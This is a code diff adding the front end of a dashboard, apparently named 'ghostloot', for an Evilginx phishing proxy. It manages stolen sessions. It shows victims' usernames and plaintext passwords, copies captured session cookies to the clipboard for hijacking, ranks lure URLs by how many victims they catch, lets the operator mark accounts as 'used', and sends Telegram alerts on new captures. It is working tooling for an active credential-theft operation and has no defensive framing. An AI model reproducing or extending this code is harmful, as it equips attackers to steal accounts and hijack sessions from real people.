+    let e=m.get(u); if(!e){ e={url:u,visits:0,valid:0,users:new Set()}; m.set(u,e); }
+    e.visits++; if(s.valid) e.valid++; if(s.username) e.users.add(s.username.toLowerCase());
   }
+  const rows=[...m.values()].sort((a,b)=>b.valid-a.valid||b.visits-a.visits);
+  $('#luresview').innerHTML =
+    `<div class="wrap"><table><thead><tr>
+       <th>${t('lure_col')}</th><th>${t('visits_col')}</th><th>${t('valid_col')}</th><th>${t('victims_col')}</th><th>${t('conv_col')}</th>
+     </tr></thead><tbody>`+
+    (rows.length?rows.map(e=>{ const conv=e.visits?Math.round(e.valid/e.visits*100):0;
+      return `<tr><td style="font-family:ui-monospace,Menlo,monospace;font-size:12px;color:var(--acc);word-break:break-all">${esc(e.url)}</td>
+        <td class="num">${e.visits}</td><td class="num">${e.valid}</td><td class="num">${e.users.size}</td><td class="num">${conv}%</td></tr>`;
+    }).join(''):`<tr><td colspan="5" class="empty">${t('no_lures')}</td></tr>`)+`</tbody></table></div>`;
+}
 
-  // ── Touch/swipe ──────────────────────────────────────────────
-  let touchStartX = 0;
-  document.addEventListener('touchstart', function(e) {
-    touchStartX = e.changedTouches[0].screenX;
-  }, {passive: true});
-  document.addEventListener('touchend', function(e) {
-    const dx = e.changedTouches[0].screenX - touchStartX;
-    if (Math.abs(dx) > 50) showSlide(current + (dx < 0 ? 1 : -1));
-  }, {passive: true});
+async function loadVState(){ try{ window._vstate=await (await fetch('/api/vstate')).json()||{}; }catch(e){ window._vstate={}; } }
+async function loadHealth(){
+  try{
+    const h=await (await fetch('/api/health')).json();
+    const up=h.evilginx_up?`<span style="color:var(--ok)">${t('health_up')}</span>`:`<span style="color:var(--bad)">${t('health_down')}</span>`;
+    const last=h.last_capture?t('last_capture')+' '+relTime(h.last_capture):t('no_captures');
+    const kb=(h.db_size_bytes/1024).toFixed(0);
+    $('#foothealth').innerHTML=`${up} · ${last} · db ${kb} KB · v${h.version}`;
+    const dot=document.querySelector('.brand .dot'); if(dot) dot.style.background=h.evilginx_up?'var(--ok)':'var(--bad)';
+  }catch(e){}
+}
 
-})();
+function renderVictims(){
+  const all=victims();
+  const filtered=applyFilter(all, v=>v.username, v=>v.phishlets);
+  const getters={ user:v=>v.username, phishlet:v=>v.phishlets.join(','), valid:v=>v.valid?1:0, cookies:v=>v.best?v.best.cookies:0, attempts:v=>v.sessions.length, update:v=>v.lastUpdate };
+  const rows=sortList(filtered,getters);
+  $('#kpis').innerHTML=kpiHTML([
+    {n:all.length,l:t('kpi_unique'),c:'b'},
+    {n:all.filter(v=>v.valid).length,l:t('kpi_valid'),c:'g'},
+    {n:all.filter(v=>v.creds).length,l:t('kpi_creds'),c:'p'},
+    {n:noiseCount(),l:t('kpi_nologin'),c:'w'},
+    {n:new Set(state.raw.map(s=>s.phishlet)).size,l:t('kpi_phishlets')},
+  ]);
+  $('#thead').innerHTML=th([
+    ['','',false],['user',t('th_user'),true],['phishlet',t('th_phishlet'),true],['valid',t('th_session'),true],
+    ['cookies',t('th_cookies'),true],['attempts',t('th_attempts'),true],['',t('th_lastip'),false],['update',t('th_seen'),true],['',t('th_loot'),false]
+  ]);
+  $('#tbody').innerHTML = rows.length ? rows.map(v=>{
+    const b=v.best; const rid='v_'+b.id;
+    const vst=(window._vstate||{})[v.username.toLowerCase()]||{};
+    const ips=new Set(v.sessions.map(s=>s.remote_addr).filter(Boolean)); const multiIp=ips.size>1;
+    return `<tr>
+      <td><span class="exp" data-exp="${rid}">▸</span></td>
+      <td class="u">${esc(v.username)}</td>
+      <td>${v.phishlets.map(p=>`<span class="phl">${esc(p)}</span>`).join('')}</td>
+      <td>${v.valid?`<span class="pill ok">${t('valid')}</span>`:`<span class="pill bad">${t('no')}</span>`}${vst.used?`<span class="badge used">${t('used')}</span>`:''}${multiIp?`<span class="badge mip" title="${t('mip_title')(ips.size)}">multi-IP</span>`:''}</td>
+      <td class="num">${b.cookies}</td>
+      <td class="num">${v.sessions.length}${v.sessions.length>1?` <span class="mut">(${t('dup')})</span>`:''}</td>
+      <td class="mut">${esc(v.lastIP)}</td>
+      <td title="${absTime(v.lastUpdate)}">${relTime(v.lastUpdate)}</td>
+      <td>${b.cookies?loot(b.id):'<span class="mut">-</span>'}</td>
+    </tr>
+    <tr class="detail" id="${rid}" hidden><td colspan="9"><div class="inner">
+      <div class="dgrid">
+        <div><div class="k">${t('best_session')}</div><div class="v">#${b.id} · ${b.cookies} ${t('cookies_w')} · ${b.valid?t('valid'):t('invalid')}</div></div>
+        <div><div class="k">${t('useragent')}</div><div class="v">${esc(b.useragent)}</div></div>
+        <div><div class="k">${t('landing')}</div><div class="v">${esc(b.landing)}</div></div>
+      </div>
+      <div class="k" style="margin-bottom:4px">${t('attempts_h')} (${v.sessions.length})</div>
+      <div class="attempts">${v.sessions.sort((a,b)=>b.update-a.update).map(s=>`
+        <div class="a">
+          <span class="mut">#${s.id}</span>
+          <span class="phl">${esc(s.phishlet)}</span>
+          ${s.valid?`<span class="pill ok">${t('valid')}</span>`:`<span class="pill bad">${t('no')}</span>`}
+          <span class="num">${s.cookies} ${t('cookies_w')}</span>
+          <span class="mut">${esc(s.remote_addr)}</span>
+          <span class="mut" title="${absTime(s.update)}">${relTime(s.update)}</span>
+          ${s.password?`<span class="secret hide" onclick="this.classList.toggle('hide')">${esc(s.password)}</span>`:''}
+          <span class="spacer" style="flex:1"></span>
+          ${s.cookies?`<button class="rowbtn primary" data-copy="${s.id}">${t('copy_cookies')}</button> <button class="rowbtn" data-view="${s.id}">JSON</button> <button class="rowbtn" data-ck="${s.id}" data-box="${rid}">${t('view_cookies')}</button>`:''}
+        </div>`).join('')}</div>
+      <div class="cookies-list" id="ck_${rid}" hidden></div>
+      <div class="vstate">
+        <label class="setchk"><input type="checkbox" data-used="${esc(v.username)}" ${vst.used?'checked':''}> ${t('mark_used')}</label>
+        <input class="notes" data-notesuser="${esc(v.username)}" placeholder="${t('notes_ph')}" value="${esc(vst.notes||'')}">
+        <button class="rowbtn" data-savevs="${esc(v.username)}">${t('save')}</button>
+        ${multiIp?`<span class="mut" style="font-size:11px">IPs: ${[...ips].join(', ')}</span>`:''}
+      </div>
+    </div></td></tr>`;
+  }).join('') : `<tr><td colspan="9" class="empty">${t('empty_victims')}</td></tr>`;
+  $('#count').textContent = `${rows.length} ${t('of')} ${all.length} ${t('victims_l')}`;
+  bindRows();
+}
+
+function renderSessions(){
+  let all=state.raw.slice();
+  if(!state.showNoise) all=all.filter(s=>(s.username||'').trim());
+  const filtered=applyFilter(all, s=>s.username, s=>s.phishlet);
+  const getters={ id:s=>s.id, phishlet:s=>s.phishlet, user:s=>s.username||'', valid:s=>s.valid?1:0, cookies:s=>s.cookies, update:s=>s.update };
+  const rows=sortList(filtered,getters);
+  $('#kpis').innerHTML=kpiHTML([
+    {n:state.raw.length,l:t('kpi_total'),c:'b'},
+    {n:state.raw.filter(s=>s.valid).length,l:t('kpi_valid'),c:'g'},
+    {n:state.raw.filter(s=>s.password).length,l:t('kpi_creds'),c:'p'},
+    {n:noiseCount(),l:t('kpi_nologin'),c:'w'},
+    {n:new Set(state.raw.map(s=>s.phishlet)).size,l:t('kpi_phishlets')},
+  ]);
+  $('#thead').innerHTML=th([
+    ['id','#',true],['phishlet',t('th_phishlet'),true],['user',t('th_user'),true],['',t('th_pass'),false],
+    ['valid',t('th_session'),true],['cookies',t('th_cookies'),true],['',t('th_ip'),false],['update',t('th_captured'),true],['',t('th_loot'),false]
+  ]);
+  $('#tbody').innerHTML = rows.length ? rows.map(s=>`
+    <tr class="${state.knownIds.size && !state.knownIds.has(s.id)?'new':''}">
+      <td class="num">${s.id}</td>
+      <td><span class="phl">${esc(s.phishlet)}</span></td>
+      <td>${esc(s.username)||'<span class="mut">-</span>'}</td>
+      <td>${s.password?`<span class="secret hide" onclick="this.classList.toggle('hide')">${esc(s.password)}</span>`:'<span class="mut">-</span>'}</td>
+      <td>${s.valid?`<span class="pill ok">${t('valid')}</span>`:`<span class="pill bad">${t('no')}</span>`}</td>
+      <td class="num">${s.cookies}</td>
+      <td class="mut">${esc(s.remote_addr)}</td>
+      <td title="${absTime(s.update)}">${relTime(s.update)}</td>
+      <td>${s.cookies?loot(s.id):'<span class="mut">-</span>'}</td>
+    </tr>`).join('') : `<tr><td colspan="9" class="empty">${t('empty_sessions')}</td></tr>`;
+  $('#count').textContent = `${rows.length} ${t('of')} ${all.length} ${t('sessions_l')}`;
+  bindRows();
+}
+
+function th(cols){
+  return '<tr>'+cols.map(([k,label,sortable])=>{
+    const sorted=sortable&&state.sort.key===k; const ar=sorted?(state.sort.dir<0?'▼':'▲'):'';
+    return `<th class="${sorted?'sorted':''}" ${sortable?`data-sort="${k}"`:''}>${label} <span class="ar">${ar}</span></th>`;
+  }).join('')+'</tr>';
+}
+function loot(id){ return `<button class="rowbtn primary" data-copy="${id}">${t('copy_cookies')}</button> <button class="rowbtn" data-view="${id}">JSON</button>`; }
+
+function bindRows(){
+  document.querySelectorAll('[data-sort]').forEach(el=>el.onclick=()=>{ const k=el.dataset.sort; if(state.sort.key===k) state.sort.dir*=-1; else state.sort={key:k,dir:-1}; render(); });
+  document.querySelectorAll('[data-exp]').forEach(el=>el.onclick=()=>{ const row=$('#'+el.dataset.exp); if(row){ row.hidden=!row.hidden; el.classList.toggle('open',!row.hidden); } });
+  document.querySelectorAll('[data-copy]').forEach(el=>el.onclick=()=>copyCookies(el.dataset.copy));
+  document.querySelectorAll('[data-view]').forEach(el=>el.onclick=()=>window.open('/cookies?id='+el.dataset.view,'_blank'));
+  document.querySelectorAll('[data-ck]').forEach(el=>el.onclick=()=>showCookies(el.dataset.ck, el.dataset.box));
+  document.querySelectorAll('[data-savevs]').forEach(el=>el.onclick=async()=>{
+    const u=el.dataset.savevs;
+    const used=document.querySelector('[data-used="'+u.replace(/"/g,'\\"')+'"]').checked;
+    const notes=document.querySelector('[data-notesuser="'+u.replace(/"/g,'\\"')+'"]').value;
+    await fetch('/api/vstate',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({user:u,used:used?'true':'false',notes})});
+    await loadVState(); toast(t('vstate_saved')); render();
+  });
+}
+
+async function copyCookies(id){
+  try{ const r=await fetch('/cookies?id='+id); const txt=(await r.text()).trim(); await navigator.clipboard.writeText(txt); toast(t('copied_paste')(id)); }
+  catch(e){ toast(t('error')+': '+e); }
+}
+async function showCookies(id, boxRid){
+  const box=$('#ck_'+boxRid); if(!box) return;
+  if(!box.hidden){ box.hidden=true; return; }
+  box.hidden=false; box.textContent=t('loading');
+  try{ const arr=await (await fetch('/cookies?id='+id)).json();
+    box.innerHTML=arr.map(c=>`<div><span class="cn">${esc(c.name)}</span> <span class="cd">@${esc(c.domain)}</span> · ${esc(c.value).slice(0,28)}${c.value.length>28?'…':''}</div>`).join('');
+  }catch(e){ box.textContent=t('error')+': '+e; }
+}
+
+// ---- Settings ----
+let setInit=false;
+function renderSettings(){
+  const v=$('#settingsview');
+  if(!setInit){
+    v.innerHTML =
+      `<h3>${t('set_title')}</h3><p class="sub">${t('set_sub')}</p>
+       <div class="card">
+         <label class="setchk"><input type="checkbox" id="s_en"> ${t('set_enable')}</label>
+         <div class="frow"><label>${t('bot_token')}</label><input type="text" id="s_tok" placeholder="123456:ABC-DEF..." autocomplete="off"></div>
+         <div class="frow"><label>${t('chat_id')}</label><input type="text" id="s_chat" placeholder="12345678" autocomplete="off"></div>
+         <label class="setchk"><input type="checkbox" id="s_min"> ${t('minimal')}</label>
+         <div class="setbtns"><button class="btn on" id="s_save">${t('save_btn')}</button><button class="btn" id="s_test">${t('send_test')}</button></div>
+       </div>
+       <p class="note">${t('set_note')}</p>`;
+    $('#s_save').onclick=saveSettings; $('#s_test').onclick=testTelegram; setInit=true;
+  }
+  loadSettingsForm();
+}
+async function loadSettingsForm(){
+  try{ const s=await (await fetch('/api/settings')).json();
+    $('#s_en').checked=!!s.tg_enabled; $('#s_chat').value=s.tg_chat||''; $('#s_min').checked=!!s.minimal_alerts;
+    $('#s_tok').value=''; $('#s_tok').placeholder=s.tg_token_set?t('token_saved'):'123456:ABC-DEF...';
+  }catch(e){}
+}
+async function saveSettings(){
+  const body=new URLSearchParams({ tg_token:$('#s_tok').value.trim(), tg_chat:$('#s_chat').value.trim(), tg_enabled:$('#s_en').checked?'true':'false', minimal_alerts:$('#s_min').checked?'true':'false' });
+  await fetch('/api/settings',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body});
+  toast(t('settings_saved')); loadSettingsForm();
+}
+async function testTelegram(){ const r=await fetch('/api/test-telegram',{method:'POST'}); if(r.ok) toast(t('test_sent')); else toast(t('error')+': '+(await r.text())); }
+
+// ---- My URLs ----
+let urlsInit=false;
+function renderUrls(){
+  const v=$('#urlsview');
+  if(!urlsInit){
+    v.innerHTML =
+      `<div class="urlbar">
+         <input id="nu" placeholder="${t('url_ph')}" autocomplete="off">
+         <input id="nl" placeholder="${t('label_ph')}" autocomplete="off" style="max-width:180px">
+         <button class="btn on" id="addurl">${t('add')}</button>
+         <label class="chk"><input type="checkbox" id="onlyactive" checked> ${t('active_only')}</label>
+         <button class="btn" id="copyactive">${t('copy_active')}</button>
+         <span class="count" id="urlcount"></span>
+       </div><div id="urllist"></div>`;
+    $('#addurl').onclick=addUrl;
+    $('#nu').addEventListener('keydown',e=>{ if(e.key==='Enter') addUrl(); });
+    $('#nl').addEventListener('keydown',e=>{ if(e.key==='Enter') addUrl(); });
+    $('#onlyactive').onchange=refreshUrlList; $('#copyactive').onclick=copyActive; urlsInit=true;
+  }
+  refreshUrlList();
+}
+async function refreshUrlList(){
+  let arr=[]; try{ arr=await (await fetch('/api/urls')).json(); }catch(e){}
+  window._urls=arr||[];
+  const only=$('#onlyactive')&&$('#onlyactive').checked;
+  const rows=window._urls.filter(u=>!only||u.ok);
+  const list=$('#urllist'); if(!list) return;
+  list.innerHTML = rows.length ? rows.map(u=>`
+    <div class="urlrow">
+      <span class="dd ${u.ok?'ok':'down'}"></span>
+      <span class="url" data-copyurl="${esc(u.url)}" title="${t('copy')}">${esc(u.url)}</span>
+      ${u.label?`<span class="lab">${esc(u.label)}</span>`:''}
+      <span class="sp"></span>
+      <span class="mut" style="font-size:11px">${u.ok?t('active'):t('down')}</span>
+      <button class="rowbtn" data-copyurl="${esc(u.url)}">${t('copy')}</button>
+      <button class="rowbtn" data-delurl="${esc(u.url)}">${t('delete')}</button>
+    </div>`).join('') : `<div class="empty">${only?t('url_empty_active'):t('url_empty')}</div>`;
+  const act=window._urls.filter(u=>u.ok).length;
+  if($('#urlcount')) $('#urlcount').textContent=t('url_saved')(act,window._urls.length);
+  document.querySelectorAll('[data-copyurl]').forEach(el=>el.onclick=async()=>{ try{await navigator.clipboard.writeText(el.dataset.copyurl); toast(t('url_copied'));}catch(e){toast(t('error')+': '+e);} });
+  document.querySelectorAll('[data-delurl]').forEach(el=>el.onclick=async()=>{ if(!confirm(t('confirm_del')))return; await fetch('/api/urls?url='+encodeURIComponent(el.dataset.delurl),{method:'DELETE'}); refreshUrlList(); });
+}
+async function addUrl(){
+  const u=$('#nu').value.trim(); if(!u) return; const l=$('#nl').value.trim();
+  await fetch('/api/urls',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({url:u,label:l})});
+  $('#nu').value=''; $('#nl').value=''; toast(t('url_added')); setTimeout(refreshUrlList,400);
+}
+async function copyActive(){
+  const act=(window._urls||[]).filter(u=>u.ok).map(u=>u.url);
+  if(!act.length){ toast(t('no_active')); return; }
+  try{ await navigator.clipboard.writeText(act.join('\n')); toast(t('active_copied')(act.length)); }catch(e){ toast(t('error')+': '+e); }
+}
+
+async function loadDomains(){
+  try{
+    const arr=await (await fetch('/api/domains')).json();
+    const el=$('#domains');
+    if(!arr||!arr.length){ el.style.display='none'; return; }
+    el.style.display='flex';
+    el.innerHTML='<span class="lbl">'+t('domains')+'</span>'+arr.map(d=>{
+      const cls=d.flagged?'flag':(d.ok?'ok':'down');
+      const st=d.flagged?t('flagged'):(d.ok?(d.code+' · '+d.latency_ms+'ms'):(d.err||('HTTP '+d.code)));
+      return `<span class="dchip" title="${esc(d.url)} · ${esc(d.checked)}"><span class="dd ${cls}"></span><span class="h">${esc(d.host)}</span><span class="s">${esc(st)}</span></span>`;
+    }).join('');
+  }catch(e){}
+}
+
+async function fetchData(force){
+  try{
+    loadDomains(); loadHealth(); await loadVState();
+    if(state.tab==='urls' && urlsInit) refreshUrlList();
+    const d=await (await fetch('/api/data')).json();
+    $('#dbpath').textContent=d.db;
+    $('#updated').textContent=t('updated')+' '+d.now;
+    const sig=d.sessions.length+':'+d.sessions.reduce((m,s)=>Math.max(m,s.update),0)+':'+d.sessions.reduce((a,s)=>a+s.cookies,0);
+    if(!force && sig===state.sig) return;
+    const ids=new Set(d.sessions.map(s=>s.id));
+    if(!state.firstLoad && sig!==state.sig){ const fresh=[...ids].filter(i=>!state.knownIds.has(i)); if(fresh.length) toast(t('new_sessions')(fresh.length)); }
+    state.sig=sig; state.raw=d.sessions;
+    const sel=$('#fphishlet'); const cur=sel.value;
+    const phls=[...new Set(d.sessions.map(s=>s.phishlet))].sort();
+    sel.innerHTML=`<option value="">${t('all_phishlets')}</option>`+phls.map(p=>`<option>${esc(p)}</option>`).join('');
+    sel.value=cur;
+    $('#foottotal').textContent=t('sessions_phishlets')(d.sessions.length,phls.length);
+    $('#footsb').innerHTML=d.sb_enabled?t('sb_on'):t('sb_off');
+    render();
+    if(!state.firstLoad) state.knownIds=ids; else { state.knownIds=ids; state.firstLoad=false; }
+  }catch(e){ toast(t('load_err')+': '+e); }
+}
+
+// ---- controls ----
+let qTimer;
+$('#q').addEventListener('input', e=>{ clearTimeout(qTimer); qTimer=setTimeout(()=>{ state.q=e.target.value.trim(); render(); },180); });
+document.addEventListener('keydown', e=>{ if(e.key==='/' && document.activeElement!==$('#q')){ e.preventDefault(); $('#q').focus(); } });
+document.querySelectorAll('.tab').forEach(tb=>tb.onclick=()=>{ state.tab=tb.dataset.tab; render(); });
+$('#fphishlet').onchange=e=>{ state.phishlet=e.target.value; render(); };
+$('#fvalid').onchange=e=>{ state.onlyValid=e.target.checked; render(); };
+$('#fnoise').onchange=e=>{ state.showNoise=e.target.checked; render(); };
+$('#refresh').onclick=()=>fetchData(true);
+$('#auto').onclick=()=>{ state.auto=!state.auto; $('#auto').classList.toggle('on',state.auto); $('#livewrap').classList.toggle('on',state.auto);
+  if(state.auto){ fetchData(false); state.timer=setInterval(()=>fetchData(false),10000); } else clearInterval(state.timer); };
+$('#langbtn').onclick=()=>{ LANG = LANG==='en'?'es':'en'; try{ localStorage.setItem('ghostloot_lang',LANG); }catch(e){}
+  setInit=false; urlsInit=false; applyStatic(); render(); loadHealth(); loadDomains(); };
+
+applyStatic();
+fetchData(true);
 </script>
-
 </body>
 </html>
